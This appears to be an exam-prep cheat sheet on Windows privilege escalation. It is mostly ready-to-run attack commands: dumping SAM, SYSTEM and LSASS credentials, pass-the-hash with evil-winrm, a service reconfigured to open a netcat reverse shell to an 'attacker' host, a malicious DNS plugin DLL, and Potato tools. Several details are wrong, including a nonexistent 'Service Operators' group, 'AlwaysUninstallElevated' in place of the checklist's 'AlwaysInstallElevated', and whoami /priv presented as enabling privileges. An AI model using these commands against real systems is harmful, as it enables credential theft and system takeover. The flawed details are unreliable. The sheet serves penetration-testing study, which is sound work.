# Windows Privilege Escalation Cheat Sheet
*OSCP / GPEN Focus*

---

# Dangerous Groups

## Administrators
**Privilege:** Full control over the machine.

### Checks

```powershell
whoami /groups
net localgroup administrators
```

No escalation required.

---

## Backup Operators

### Why it is dangerous

Members possess:

- `SeBackupPrivilege`
- `SeRestorePrivilege`

These privileges allow bypassing NTFS permissions.

### Abuse

#### Enable the privileges

```cmd
whoami /priv
```

#### Dump SAM & SYSTEM

```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

or

```powershell
diskshadow
```

Create shadow copy

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .
```

Extract hashes

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Pass-the-Hash

```bash
evil-winrm -i target -u Administrator -H <hash>
```

---

## Server Operators

### Why it is dangerous

Can:

- Start services
- Stop services
- Configure services

Often leads to SYSTEM.

### Enumeration

```cmd
sc query
```

### Abuse

Replace service executable or modify service configuration.

```cmd
sc config VulnService binPath= "C:\Temp\nc.exe -e cmd.exe attacker 4444"
```

Restart

```cmd
sc stop VulnService
sc start VulnService
```

---

## Print Operators

Can load drivers on Domain Controllers.

Rare but dangerous.

---

## Account Operators

Can create and manage users.

Sometimes able to add users into privileged groups depending on delegation.

---

## DNSAdmins

Very common privilege escalation in Active Directory.

### Abuse

Configure malicious plugin DLL.

```cmd
dnscmd /config /serverlevelplugindll C:\Temp\evil.dll
```

Restart DNS service.

SYSTEM code execution.

---

## Hyper-V Administrators

Can mount virtual disks.

Offline attack against VHDX files.

Possible extraction of SAM/NTDS.

---

## Event Log Readers

Not a direct escalation.

Useful for:

- Credentials
- Passwords
- Tokens
- Service account information

---

## Remote Desktop Users

Useful lateral movement.

Not privilege escalation.

---

## Remote Management Users

Allows WinRM.

Useful together with credential theft.

---

## Distributed COM Users

May enable DCOM abuse.

Can sometimes launch privileged COM objects.

---

## Cryptographic Operators

Rare.

Can manipulate cryptographic services.

Usually not enough alone.

---

## Performance Log Users

Sometimes useful with writable scheduled tasks.

---

## Service Operators

### Why it is dangerous

Can start and stop services.

If service binary or configuration is writable:

SYSTEM.

### Enumeration

```cmd
whoami /groups
```

List services

```cmd
sc query
```

Check permissions

```cmd
accesschk.exe -uwcqv *
```

### Abuse

Change executable

```cmd
sc config ServiceName binPath= "C:\Temp\shell.exe"
```

Restart

```cmd
net stop ServiceName
net start ServiceName
```

---

# Dangerous Privileges

---

## SeBackupPrivilege

Allows reading every file.

### Abuse

Dump:

- SAM
- SYSTEM
- SECURITY
- NTDS.dit

Tools

- reg save
- diskshadow
- robocopy /B
- Copy-FileSeBackupPrivilege.ps1

---

## SeRestorePrivilege

Allows writing anywhere.

Can replace binaries.

Can overwrite service executable.

---

## SeTakeOwnershipPrivilege

Take ownership of any file.

```cmd
takeown /f file
icacls file /grant user:F
```

---

## SeImpersonatePrivilege

### Very common

Potato attacks

- JuicyPotato
- RoguePotato
- PrintSpoofer
- GodPotato

Usually SYSTEM.

Example

```cmd
PrintSpoofer.exe -i -c cmd
```

---

## SeAssignPrimaryTokenPrivilege

Often abused together with impersonation.

---

## SeLoadDriverPrivilege

Load arbitrary kernel drivers.

Usually SYSTEM.

Rare.

---

## SeDebugPrivilege

Open SYSTEM processes.

Dump LSASS.

```cmd
procdump.exe -ma lsass.exe lsass.dmp
```

Parse

```bash
pypykatz lsa minidump lsass.dmp
```

---

## SeCreateTokenPrivilege

Create arbitrary access tokens.

Immediate SYSTEM.

Very rare.

---

## SeTcbPrivilege

Act as Operating System.

Game over.

Rare.

---

## SeManageVolumePrivilege

Can manipulate filesystem metadata.

Occasionally leads to privilege escalation.

---

## SeRestorePrivilege

Can replace binaries in System32.

Useful against services.

---

# Service Abuse

---

## Weak Service Permissions

Enumeration

```cmd
accesschk.exe -uwcqv *
```

or

```powershell
Get-Service
```

Modify

```cmd
sc config VulnService binPath= "C:\Temp\shell.exe"
```

Restart.

SYSTEM.

---

## Unquoted Service Path

Example

```
C:\Program Files\Vuln App\service.exe
```

Windows checks

```
C:\Program.exe
```

Place malicious executable.

Restart service.

---

## Writable Service Binary

Find

```cmd
icacls "C:\Program Files\Service\service.exe"
```

Replace executable.

Restart.

---

# Scheduled Tasks

List

```cmd
schtasks /query /fo LIST /v
```

Check

- Writable executable
- Writable script
- Writable folder

Replace payload.

Wait for execution.

---

# Registry Abuse

AlwaysUninstallElevated

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

If enabled

```bash
msfvenom ...
```

Install MSI as SYSTEM.

---

# AutoLogon Credentials

```cmd
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Look for

- DefaultUserName
- DefaultPassword

---

# Unattended Installation Files

Search

```
unattend.xml
sysprep.inf
sysprep.xml
```

Locations

```
C:\Windows\Panther\
C:\Windows\System32\Sysprep\
```

---

# Saved Credentials

```cmd
cmdkey /list
```

Run

```cmd
runas /savecred
```

---

# Credential Manager

```cmd
vaultcmd /list
```

---

# GPP Passwords

Search

```
Groups.xml
```

Decrypt cpassword.

---

# Always Check

## Groups

```cmd
whoami /groups
```

---

## Privileges

```cmd
whoami /priv
```

---

## Services

```cmd
sc query
```

---

## Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
```

---

## Installed Software

```cmd
wmic product get name
```

or

```powershell
Get-Package
```

---

## Drivers

```cmd
driverquery
```

---

## Startup

```cmd
wmic startup get caption,command
```

---

## Environment

```cmd
set
```

---

## Running Processes

```cmd
tasklist /svc
```

---

## Network

```cmd
netstat -ano
```

---

# Common Tools

## WinPEAS

```cmd
winPEASx64.exe
```

---

## Seatbelt

```cmd
Seatbelt.exe -group=all
```

---

## PowerUp

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

---

## SharpUp

```cmd
SharpUp.exe
```

---

## AccessChk

```cmd
accesschk.exe -uwcqv *
```

---

## SharpHound

```cmd
SharpHound.exe
```

---

# Quick OSCP Checklist

- [ ] `whoami /groups`
- [ ] `whoami /priv`
- [ ] WinPEAS
- [ ] Seatbelt
- [ ] PowerUp
- [ ] Check services
- [ ] Check scheduled tasks
- [ ] Check writable binaries
- [ ] Check unquoted service paths
- [ ] Check AlwaysInstallElevated
- [ ] Check AutoLogon credentials
- [ ] Check unattended files
- [ ] Check Credential Manager
- [ ] Check GPP passwords
- [ ] Check Backup Operators
- [ ] Check Service Operators
- [ ] Check SeImpersonatePrivilege
- [ ] Check SeBackupPrivilege
- [ ] Check PATH hijacking
- [ ] Check DLL hijacking
- [ ] Check writable registry keys
- [ ] Check startup folders
- [ ] Check AV exclusions
- [ ] Check installed software versions
